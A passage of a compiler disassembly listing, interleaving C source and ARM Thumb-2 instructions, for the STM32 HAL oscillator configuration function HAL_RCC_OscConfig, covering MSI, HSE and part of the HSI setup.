    if((sysclk_source == RCC_CFGR_SWS_MSI) ||
 80038e6:	69bb      	ldr	r3, [r7, #24]
 80038e8:	2b00      	cmp	r3, #0
 80038ea:	d007      	beq.n	80038fc <HAL_RCC_OscConfig+0x4c>
 80038ec:	69bb      	ldr	r3, [r7, #24]
 80038ee:	2b0c      	cmp	r3, #12
 80038f0:	f040 808b 	bne.w	8003a0a <HAL_RCC_OscConfig+0x15a>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_MSI)))
 80038f4:	697b      	ldr	r3, [r7, #20]
 80038f6:	2b01      	cmp	r3, #1
 80038f8:	f040 8087 	bne.w	8003a0a <HAL_RCC_OscConfig+0x15a>
    {
      if((READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U) && (RCC_OscInitStruct->MSIState == RCC_MSI_OFF))
 80038fc:	4b88      	ldr	r3, [pc, #544]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 80038fe:	681b      	ldr	r3, [r3, #0]
 8003900:	f003 0302 	and.w	r3, r3, #2
 8003904:	2b00      	cmp	r3, #0
 8003906:	d005      	beq.n	8003914 <HAL_RCC_OscConfig+0x64>
 8003908:	687b      	ldr	r3, [r7, #4]
 800390a:	699b      	ldr	r3, [r3, #24]
 800390c:	2b00      	cmp	r3, #0
 800390e:	d101      	bne.n	8003914 <HAL_RCC_OscConfig+0x64>
      {
        return HAL_ERROR;
 8003910:	2301      	movs	r3, #1
 8003912:	e3d9      	b.n	80040c8 <HAL_RCC_OscConfig+0x818>
      else
      {
        /* To correctly read data from FLASH memory, the number of wait states (LATENCY)
           must be correctly programmed according to the frequency of the CPU clock
           (HCLK) and the supply voltage of the device. */
        if(RCC_OscInitStruct->MSIClockRange > __HAL_RCC_GET_MSI_RANGE())
 8003914:	687b      	ldr	r3, [r7, #4]
 8003916:	6a1a      	ldr	r2, [r3, #32]
 8003918:	4b81      	ldr	r3, [pc, #516]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 800391a:	681b      	ldr	r3, [r3, #0]
 800391c:	f003 0308 	and.w	r3, r3, #8
 8003920:	2b00      	cmp	r3, #0
 8003922:	d004      	beq.n	800392e <HAL_RCC_OscConfig+0x7e>
 8003924:	4b7e      	ldr	r3, [pc, #504]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003926:	681b      	ldr	r3, [r3, #0]
 8003928:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 800392c:	e005      	b.n	800393a <HAL_RCC_OscConfig+0x8a>
 800392e:	4b7c      	ldr	r3, [pc, #496]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003930:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003934:	091b      	lsrs	r3, r3, #4
 8003936:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 800393a:	4293      	cmp	r3, r2
 800393c:	d223      	bcs.n	8003986 <HAL_RCC_OscConfig+0xd6>
        {
          /* First increase number of wait states update if necessary */
          if(RCC_SetFlashLatencyFromMSIRange(RCC_OscInitStruct->MSIClockRange) != HAL_OK)
 800393e:	687b      	ldr	r3, [r7, #4]
 8003940:	6a1b      	ldr	r3, [r3, #32]
 8003942:	4618      	mov	r0, r3
 8003944:	f000 fd8c 	bl	8004460 <RCC_SetFlashLatencyFromMSIRange>
 8003948:	4603      	mov	r3, r0
 800394a:	2b00      	cmp	r3, #0
 800394c:	d001      	beq.n	8003952 <HAL_RCC_OscConfig+0xa2>
          {
            return HAL_ERROR;
 800394e:	2301      	movs	r3, #1
 8003950:	e3ba      	b.n	80040c8 <HAL_RCC_OscConfig+0x818>
          }

          /* Selects the Multiple Speed oscillator (MSI) clock range .*/
          __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 8003952:	4b73      	ldr	r3, [pc, #460]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003954:	681b      	ldr	r3, [r3, #0]
 8003956:	4a72      	ldr	r2, [pc, #456]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003958:	f043 0308 	orr.w	r3, r3, #8
 800395c:	6013      	str	r3, [r2, #0]
 800395e:	4b70      	ldr	r3, [pc, #448]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003960:	681b      	ldr	r3, [r3, #0]
 8003962:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8003966:	687b      	ldr	r3, [r7, #4]
 8003968:	6a1b      	ldr	r3, [r3, #32]
 800396a:	496d      	ldr	r1, [pc, #436]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 800396c:	4313      	orrs	r3, r2
 800396e:	600b      	str	r3, [r1, #0]
          /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
          __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 8003970:	4b6b      	ldr	r3, [pc, #428]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003972:	685b      	ldr	r3, [r3, #4]
 8003974:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 8003978:	687b      	ldr	r3, [r7, #4]
 800397a:	69db      	ldr	r3, [r3, #28]
 800397c:	021b      	lsls	r3, r3, #8
 800397e:	4968      	ldr	r1, [pc, #416]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003980:	4313      	orrs	r3, r2
 8003982:	604b      	str	r3, [r1, #4]
 8003984:	e025      	b.n	80039d2 <HAL_RCC_OscConfig+0x122>
        }
        else
        {
          /* Else, keep current flash latency while decreasing applies */
          /* Selects the Multiple Speed oscillator (MSI) clock range .*/
          __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 8003986:	4b66      	ldr	r3, [pc, #408]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003988:	681b      	ldr	r3, [r3, #0]
 800398a:	4a65      	ldr	r2, [pc, #404]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 800398c:	f043 0308 	orr.w	r3, r3, #8
 8003990:	6013      	str	r3, [r2, #0]
 8003992:	4b63      	ldr	r3, [pc, #396]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003994:	681b      	ldr	r3, [r3, #0]
 8003996:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 800399a:	687b      	ldr	r3, [r7, #4]
 800399c:	6a1b      	ldr	r3, [r3, #32]
 800399e:	4960      	ldr	r1, [pc, #384]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 80039a0:	4313      	orrs	r3, r2
 80039a2:	600b      	str	r3, [r1, #0]
          /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
          __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 80039a4:	4b5e      	ldr	r3, [pc, #376]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 80039a6:	685b      	ldr	r3, [r3, #4]
 80039a8:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 80039ac:	687b      	ldr	r3, [r7, #4]
 80039ae:	69db      	ldr	r3, [r3, #28]
 80039b0:	021b      	lsls	r3, r3, #8
 80039b2:	495b      	ldr	r1, [pc, #364]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 80039b4:	4313      	orrs	r3, r2
 80039b6:	604b      	str	r3, [r1, #4]

          /* Decrease number of wait states update if necessary */
          /* Only possible when MSI is the System clock source  */
          if(sysclk_source == RCC_CFGR_SWS_MSI)
 80039b8:	69bb      	ldr	r3, [r7, #24]
 80039ba:	2b00      	cmp	r3, #0
 80039bc:	d109      	bne.n	80039d2 <HAL_RCC_OscConfig+0x122>
          {
            if(RCC_SetFlashLatencyFromMSIRange(RCC_OscInitStruct->MSIClockRange) != HAL_OK)
 80039be:	687b      	ldr	r3, [r7, #4]
 80039c0:	6a1b      	ldr	r3, [r3, #32]
 80039c2:	4618      	mov	r0, r3
 80039c4:	f000 fd4c 	bl	8004460 <RCC_SetFlashLatencyFromMSIRange>
 80039c8:	4603      	mov	r3, r0
 80039ca:	2b00      	cmp	r3, #0
 80039cc:	d001      	beq.n	80039d2 <HAL_RCC_OscConfig+0x122>
            {
              return HAL_ERROR;
 80039ce:	2301      	movs	r3, #1
 80039d0:	e37a      	b.n	80040c8 <HAL_RCC_OscConfig+0x818>
            }
          }
        }

        /* Update the SystemCoreClock global variable */
        SystemCoreClock = HAL_RCC_GetSysClockFreq() >> (AHBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_HPRE) >> RCC_CFGR_HPRE_Pos] & 0x1FU);
 80039d2:	f000 fc81 	bl	80042d8 <HAL_RCC_GetSysClockFreq>
 80039d6:	4602      	mov	r2, r0
 80039d8:	4b51      	ldr	r3, [pc, #324]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 80039da:	689b      	ldr	r3, [r3, #8]
 80039dc:	091b      	lsrs	r3, r3, #4
 80039de:	f003 030f 	and.w	r3, r3, #15
 80039e2:	4950      	ldr	r1, [pc, #320]	; (8003b24 <HAL_RCC_OscConfig+0x274>)
 80039e4:	5ccb      	ldrb	r3, [r1, r3]
 80039e6:	f003 031f 	and.w	r3, r3, #31
 80039ea:	fa22 f303 	lsr.w	r3, r2, r3
 80039ee:	4a4e      	ldr	r2, [pc, #312]	; (8003b28 <HAL_RCC_OscConfig+0x278>)
 80039f0:	6013      	str	r3, [r2, #0]

        /* Configure the source of time base considering new system clocks settings*/
        status = HAL_InitTick(uwTickPrio);
 80039f2:	4b4e      	ldr	r3, [pc, #312]	; (8003b2c <HAL_RCC_OscConfig+0x27c>)
 80039f4:	681b      	ldr	r3, [r3, #0]
 80039f6:	4618      	mov	r0, r3
 80039f8:	f7fd fb86 	bl	8001108 <HAL_InitTick>
 80039fc:	4603      	mov	r3, r0
 80039fe:	73fb      	strb	r3, [r7, #15]
        if(status != HAL_OK)
 8003a00:	7bfb      	ldrb	r3, [r7, #15]
 8003a02:	2b00      	cmp	r3, #0
 8003a04:	d052      	beq.n	8003aac <HAL_RCC_OscConfig+0x1fc>
        {
          return status;
 8003a06:	7bfb      	ldrb	r3, [r7, #15]
 8003a08:	e35e      	b.n	80040c8 <HAL_RCC_OscConfig+0x818>
      }
    }
    else
    {
      /* Check the MSI State */
      if(RCC_OscInitStruct->MSIState != RCC_MSI_OFF)
 8003a0a:	687b      	ldr	r3, [r7, #4]
 8003a0c:	699b      	ldr	r3, [r3, #24]
 8003a0e:	2b00      	cmp	r3, #0
 8003a10:	d032      	beq.n	8003a78 <HAL_RCC_OscConfig+0x1c8>
      {
        /* Enable the Internal High Speed oscillator (MSI). */
        __HAL_RCC_MSI_ENABLE();
 8003a12:	4b43      	ldr	r3, [pc, #268]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003a14:	681b      	ldr	r3, [r3, #0]
 8003a16:	4a42      	ldr	r2, [pc, #264]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003a18:	f043 0301 	orr.w	r3, r3, #1
 8003a1c:	6013      	str	r3, [r2, #0]

        /* Get timeout */
        tickstart = HAL_GetTick();
 8003a1e:	f7fd fbc3 	bl	80011a8 <HAL_GetTick>
 8003a22:	6138      	str	r0, [r7, #16]

        /* Wait till MSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 8003a24:	e008      	b.n	8003a38 <HAL_RCC_OscConfig+0x188>
        {
          if((HAL_GetTick() - tickstart) > MSI_TIMEOUT_VALUE)
 8003a26:	f7fd fbbf 	bl	80011a8 <HAL_GetTick>
 8003a2a:	4602      	mov	r2, r0
 8003a2c:	693b      	ldr	r3, [r7, #16]
 8003a2e:	1ad3      	subs	r3, r2, r3
 8003a30:	2b02      	cmp	r3, #2
 8003a32:	d901      	bls.n	8003a38 <HAL_RCC_OscConfig+0x188>
          {
            return HAL_TIMEOUT;
 8003a34:	2303      	movs	r3, #3
 8003a36:	e347      	b.n	80040c8 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 8003a38:	4b39      	ldr	r3, [pc, #228]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003a3a:	681b      	ldr	r3, [r3, #0]
 8003a3c:	f003 0302 	and.w	r3, r3, #2
 8003a40:	2b00      	cmp	r3, #0
 8003a42:	d0f0      	beq.n	8003a26 <HAL_RCC_OscConfig+0x176>
          }
        }
         /* Selects the Multiple Speed oscillator (MSI) clock range .*/
        __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 8003a44:	4b36      	ldr	r3, [pc, #216]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003a46:	681b      	ldr	r3, [r3, #0]
 8003a48:	4a35      	ldr	r2, [pc, #212]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003a4a:	f043 0308 	orr.w	r3, r3, #8
 8003a4e:	6013      	str	r3, [r2, #0]
 8003a50:	4b33      	ldr	r3, [pc, #204]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003a52:	681b      	ldr	r3, [r3, #0]
 8003a54:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8003a58:	687b      	ldr	r3, [r7, #4]
 8003a5a:	6a1b      	ldr	r3, [r3, #32]
 8003a5c:	4930      	ldr	r1, [pc, #192]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003a5e:	4313      	orrs	r3, r2
 8003a60:	600b      	str	r3, [r1, #0]
         /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
        __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 8003a62:	4b2f      	ldr	r3, [pc, #188]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003a64:	685b      	ldr	r3, [r3, #4]
 8003a66:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 8003a6a:	687b      	ldr	r3, [r7, #4]
 8003a6c:	69db      	ldr	r3, [r3, #28]
 8003a6e:	021b      	lsls	r3, r3, #8
 8003a70:	492b      	ldr	r1, [pc, #172]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003a72:	4313      	orrs	r3, r2
 8003a74:	604b      	str	r3, [r1, #4]
 8003a76:	e01a      	b.n	8003aae <HAL_RCC_OscConfig+0x1fe>

      }
      else
      {
        /* Disable the Internal High Speed oscillator (MSI). */
        __HAL_RCC_MSI_DISABLE();
 8003a78:	4b29      	ldr	r3, [pc, #164]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003a7a:	681b      	ldr	r3, [r3, #0]
 8003a7c:	4a28      	ldr	r2, [pc, #160]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003a7e:	f023 0301 	bic.w	r3, r3, #1
 8003a82:	6013      	str	r3, [r2, #0]

        /* Get timeout */
        tickstart = HAL_GetTick();
 8003a84:	f7fd fb90 	bl	80011a8 <HAL_GetTick>
 8003a88:	6138      	str	r0, [r7, #16]

        /* Wait till MSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U)
 8003a8a:	e008      	b.n	8003a9e <HAL_RCC_OscConfig+0x1ee>
        {
          if((HAL_GetTick() - tickstart) > MSI_TIMEOUT_VALUE)
 8003a8c:	f7fd fb8c 	bl	80011a8 <HAL_GetTick>
 8003a90:	4602      	mov	r2, r0
 8003a92:	693b      	ldr	r3, [r7, #16]
 8003a94:	1ad3      	subs	r3, r2, r3
 8003a96:	2b02      	cmp	r3, #2
 8003a98:	d901      	bls.n	8003a9e <HAL_RCC_OscConfig+0x1ee>
          {
            return HAL_TIMEOUT;
 8003a9a:	2303      	movs	r3, #3
 8003a9c:	e314      	b.n	80040c8 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U)
 8003a9e:	4b20      	ldr	r3, [pc, #128]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003aa0:	681b      	ldr	r3, [r3, #0]
 8003aa2:	f003 0302 	and.w	r3, r3, #2
 8003aa6:	2b00      	cmp	r3, #0
 8003aa8:	d1f0      	bne.n	8003a8c <HAL_RCC_OscConfig+0x1dc>
 8003aaa:	e000      	b.n	8003aae <HAL_RCC_OscConfig+0x1fe>
      if((READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U) && (RCC_OscInitStruct->MSIState == RCC_MSI_OFF))
 8003aac:	bf00      	nop
        }
      }
    }
  }
  /*------------------------------- HSE Configuration ------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSE) == RCC_OSCILLATORTYPE_HSE)
 8003aae:	687b      	ldr	r3, [r7, #4]
 8003ab0:	681b      	ldr	r3, [r3, #0]
 8003ab2:	f003 0301 	and.w	r3, r3, #1
 8003ab6:	2b00      	cmp	r3, #0
 8003ab8:	d073      	beq.n	8003ba2 <HAL_RCC_OscConfig+0x2f2>
  {
    /* Check the parameters */
    assert_param(IS_RCC_HSE(RCC_OscInitStruct->HSEState));

    /* When the HSE is used as system clock or clock source for PLL in these cases it is not allowed to be disabled */
    if((sysclk_source == RCC_CFGR_SWS_HSE) ||
 8003aba:	69bb      	ldr	r3, [r7, #24]
 8003abc:	2b08      	cmp	r3, #8
 8003abe:	d005      	beq.n	8003acc <HAL_RCC_OscConfig+0x21c>
 8003ac0:	69bb      	ldr	r3, [r7, #24]
 8003ac2:	2b0c      	cmp	r3, #12
 8003ac4:	d10e      	bne.n	8003ae4 <HAL_RCC_OscConfig+0x234>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_HSE)))
 8003ac6:	697b      	ldr	r3, [r7, #20]
 8003ac8:	2b03      	cmp	r3, #3
 8003aca:	d10b      	bne.n	8003ae4 <HAL_RCC_OscConfig+0x234>
    {
      if((READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U) && (RCC_OscInitStruct->HSEState == RCC_HSE_OFF))
 8003acc:	4b14      	ldr	r3, [pc, #80]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003ace:	681b      	ldr	r3, [r3, #0]
 8003ad0:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003ad4:	2b00      	cmp	r3, #0
 8003ad6:	d063      	beq.n	8003ba0 <HAL_RCC_OscConfig+0x2f0>
 8003ad8:	687b      	ldr	r3, [r7, #4]
 8003ada:	685b      	ldr	r3, [r3, #4]
 8003adc:	2b00      	cmp	r3, #0
 8003ade:	d15f      	bne.n	8003ba0 <HAL_RCC_OscConfig+0x2f0>
      {
        return HAL_ERROR;
 8003ae0:	2301      	movs	r3, #1
 8003ae2:	e2f1      	b.n	80040c8 <HAL_RCC_OscConfig+0x818>
      }
    }
    else
    {
      /* Set the new HSE configuration ---------------------------------------*/
      __HAL_RCC_HSE_CONFIG(RCC_OscInitStruct->HSEState);
 8003ae4:	687b      	ldr	r3, [r7, #4]
 8003ae6:	685b      	ldr	r3, [r3, #4]
 8003ae8:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8003aec:	d106      	bne.n	8003afc <HAL_RCC_OscConfig+0x24c>
 8003aee:	4b0c      	ldr	r3, [pc, #48]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003af0:	681b      	ldr	r3, [r3, #0]
 8003af2:	4a0b      	ldr	r2, [pc, #44]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003af4:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8003af8:	6013      	str	r3, [r2, #0]
 8003afa:	e025      	b.n	8003b48 <HAL_RCC_OscConfig+0x298>
 8003afc:	687b      	ldr	r3, [r7, #4]
 8003afe:	685b      	ldr	r3, [r3, #4]
 8003b00:	f5b3 2fa0 	cmp.w	r3, #327680	; 0x50000
 8003b04:	d114      	bne.n	8003b30 <HAL_RCC_OscConfig+0x280>
 8003b06:	4b06      	ldr	r3, [pc, #24]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003b08:	681b      	ldr	r3, [r3, #0]
 8003b0a:	4a05      	ldr	r2, [pc, #20]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003b0c:	f443 2380 	orr.w	r3, r3, #262144	; 0x40000
 8003b10:	6013      	str	r3, [r2, #0]
 8003b12:	4b03      	ldr	r3, [pc, #12]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003b14:	681b      	ldr	r3, [r3, #0]
 8003b16:	4a02      	ldr	r2, [pc, #8]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 8003b18:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8003b1c:	6013      	str	r3, [r2, #0]
 8003b1e:	e013      	b.n	8003b48 <HAL_RCC_OscConfig+0x298>
 8003b20:	40021000 	.word	0x40021000
 8003b24:	0800d198 	.word	0x0800d198
 8003b28:	20000000 	.word	0x20000000
 8003b2c:	20000004 	.word	0x20000004
 8003b30:	4ba0      	ldr	r3, [pc, #640]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003b32:	681b      	ldr	r3, [r3, #0]
 8003b34:	4a9f      	ldr	r2, [pc, #636]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003b36:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 8003b3a:	6013      	str	r3, [r2, #0]
 8003b3c:	4b9d      	ldr	r3, [pc, #628]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003b3e:	681b      	ldr	r3, [r3, #0]
 8003b40:	4a9c      	ldr	r2, [pc, #624]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003b42:	f423 2380 	bic.w	r3, r3, #262144	; 0x40000
 8003b46:	6013      	str	r3, [r2, #0]

      /* Check the HSE State */
      if(RCC_OscInitStruct->HSEState != RCC_HSE_OFF)
 8003b48:	687b      	ldr	r3, [r7, #4]
 8003b4a:	685b      	ldr	r3, [r3, #4]
 8003b4c:	2b00      	cmp	r3, #0
 8003b4e:	d013      	beq.n	8003b78 <HAL_RCC_OscConfig+0x2c8>
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003b50:	f7fd fb2a 	bl	80011a8 <HAL_GetTick>
 8003b54:	6138      	str	r0, [r7, #16]

        /* Wait till HSE is ready */
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 8003b56:	e008      	b.n	8003b6a <HAL_RCC_OscConfig+0x2ba>
        {
          if((HAL_GetTick() - tickstart) > HSE_TIMEOUT_VALUE)
 8003b58:	f7fd fb26 	bl	80011a8 <HAL_GetTick>
 8003b5c:	4602      	mov	r2, r0
 8003b5e:	693b      	ldr	r3, [r7, #16]
 8003b60:	1ad3      	subs	r3, r2, r3
 8003b62:	2b64      	cmp	r3, #100	; 0x64
 8003b64:	d901      	bls.n	8003b6a <HAL_RCC_OscConfig+0x2ba>
          {
            return HAL_TIMEOUT;
 8003b66:	2303      	movs	r3, #3
 8003b68:	e2ae      	b.n	80040c8 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 8003b6a:	4b92      	ldr	r3, [pc, #584]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003b6c:	681b      	ldr	r3, [r3, #0]
 8003b6e:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003b72:	2b00      	cmp	r3, #0
 8003b74:	d0f0      	beq.n	8003b58 <HAL_RCC_OscConfig+0x2a8>
 8003b76:	e014      	b.n	8003ba2 <HAL_RCC_OscConfig+0x2f2>
        }
      }
      else
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003b78:	f7fd fb16 	bl	80011a8 <HAL_GetTick>
 8003b7c:	6138      	str	r0, [r7, #16]

        /* Wait till HSE is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U)
 8003b7e:	e008      	b.n	8003b92 <HAL_RCC_OscConfig+0x2e2>
        {
          if((HAL_GetTick() - tickstart) > HSE_TIMEOUT_VALUE)
 8003b80:	f7fd fb12 	bl	80011a8 <HAL_GetTick>
 8003b84:	4602      	mov	r2, r0
 8003b86:	693b      	ldr	r3, [r7, #16]
 8003b88:	1ad3      	subs	r3, r2, r3
 8003b8a:	2b64      	cmp	r3, #100	; 0x64
 8003b8c:	d901      	bls.n	8003b92 <HAL_RCC_OscConfig+0x2e2>
          {
            return HAL_TIMEOUT;
 8003b8e:	2303      	movs	r3, #3
 8003b90:	e29a      	b.n	80040c8 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U)
 8003b92:	4b88      	ldr	r3, [pc, #544]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003b94:	681b      	ldr	r3, [r3, #0]
 8003b96:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003b9a:	2b00      	cmp	r3, #0
 8003b9c:	d1f0      	bne.n	8003b80 <HAL_RCC_OscConfig+0x2d0>
 8003b9e:	e000      	b.n	8003ba2 <HAL_RCC_OscConfig+0x2f2>
      if((READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U) && (RCC_OscInitStruct->HSEState == RCC_HSE_OFF))
 8003ba0:	bf00      	nop
        }
      }
    }
  }
  /*----------------------------- HSI Configuration --------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSI) == RCC_OSCILLATORTYPE_HSI)
 8003ba2:	687b      	ldr	r3, [r7, #4]
 8003ba4:	681b      	ldr	r3, [r3, #0]
 8003ba6:	f003 0302 	and.w	r3, r3, #2
 8003baa:	2b00      	cmp	r3, #0
 8003bac:	d060      	beq.n	8003c70 <HAL_RCC_OscConfig+0x3c0>
    /* Check the parameters */
    assert_param(IS_RCC_HSI(RCC_OscInitStruct->HSIState));
    assert_param(IS_RCC_HSI_CALIBRATION_VALUE(RCC_OscInitStruct->HSICalibrationValue));

    /* Check if HSI is used as system clock or as PLL source when PLL is selected as system clock */
    if((sysclk_source == RCC_CFGR_SWS_HSI) ||
 8003bae:	69bb      	ldr	r3, [r7, #24]
 8003bb0:	2b04      	cmp	r3, #4
 8003bb2:	d005      	beq.n	8003bc0 <HAL_RCC_OscConfig+0x310>
 8003bb4:	69bb      	ldr	r3, [r7, #24]
 8003bb6:	2b0c      	cmp	r3, #12
 8003bb8:	d119      	bne.n	8003bee <HAL_RCC_OscConfig+0x33e>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_HSI)))
 8003bba:	697b      	ldr	r3, [r7, #20]
 8003bbc:	2b02      	cmp	r3, #2
 8003bbe:	d116      	bne.n	8003bee <HAL_RCC_OscConfig+0x33e>
    {
      /* When HSI is used as system clock it will not be disabled */
      if((READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U) && (RCC_OscInitStruct->HSIState == RCC_HSI_OFF))
 8003bc0:	4b7c      	ldr	r3, [pc, #496]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003bc2:	681b      	ldr	r3, [r3, #0]
 8003bc4:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003bc8:	2b00      	cmp	r3, #0
 8003bca:	d005      	beq.n	8003bd8 <HAL_RCC_OscConfig+0x328>
 8003bcc:	687b      	ldr	r3, [r7, #4]
 8003bce:	68db      	ldr	r3, [r3, #12]
 8003bd0:	2b00      	cmp	r3, #0
 8003bd2:	d101      	bne.n	8003bd8 <HAL_RCC_OscConfig+0x328>
      {
        return HAL_ERROR;
 8003bd4:	2301      	movs	r3, #1
 8003bd6:	e277      	b.n	80040c8 <HAL_RCC_OscConfig+0x818>
      }
      /* Otherwise, just the calibration is allowed */
      else
      {
        /* Adjusts the Internal High Speed oscillator (HSI) calibration value.*/
        __HAL_RCC_HSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->HSICalibrationValue);
 8003bd8:	4b76      	ldr	r3, [pc, #472]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003bda:	685b      	ldr	r3, [r3, #4]
 8003bdc:	f023 52f8 	bic.w	r2, r3, #520093696	; 0x1f000000
 8003be0:	687b      	ldr	r3, [r7, #4]
 8003be2:	691b      	ldr	r3, [r3, #16]
 8003be4:	061b      	lsls	r3, r3, #24
 8003be6:	4973      	ldr	r1, [pc, #460]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003be8:	4313      	orrs	r3, r2
 8003bea:	604b      	str	r3, [r1, #4]
      if((READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U) && (RCC_OscInitStruct->HSIState == RCC_HSI_OFF))
 8003bec:	e040      	b.n	8003c70 <HAL_RCC_OscConfig+0x3c0>
      }
    }
    else
    {
      /* Check the HSI State */
      if(RCC_OscInitStruct->HSIState != RCC_HSI_OFF)
 8003bee:	687b      	ldr	r3, [r7, #4]
 8003bf0:	68db      	ldr	r3, [r3, #12]
 8003bf2:	2b00      	cmp	r3, #0
 8003bf4:	d023      	beq.n	8003c3e <HAL_RCC_OscConfig+0x38e>
      {
        /* Enable the Internal High Speed oscillator (HSI). */
        __HAL_RCC_HSI_ENABLE();
 8003bf6:	4b6f      	ldr	r3, [pc, #444]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003bf8:	681b      	ldr	r3, [r3, #0]
 8003bfa:	4a6e      	ldr	r2, [pc, #440]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003bfc:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8003c00:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003c02:	f7fd fad1 	bl	80011a8 <HAL_GetTick>
 8003c06:	6138      	str	r0, [r7, #16]

        /* Wait till HSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
